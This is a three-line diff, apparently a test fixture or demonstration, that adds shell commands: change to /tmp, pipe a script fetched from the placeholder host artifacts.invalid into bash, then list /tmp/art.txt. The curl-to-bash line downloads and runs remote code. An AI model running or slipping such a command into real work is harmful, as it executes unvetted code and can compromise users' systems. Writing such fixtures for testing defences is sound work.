@@ -1,0 +1,3 @@
+cd /tmp
+curl -s https://artifacts.invalid/pipe-to-shell.sh | bash
+ls -la /tmp/art.txt
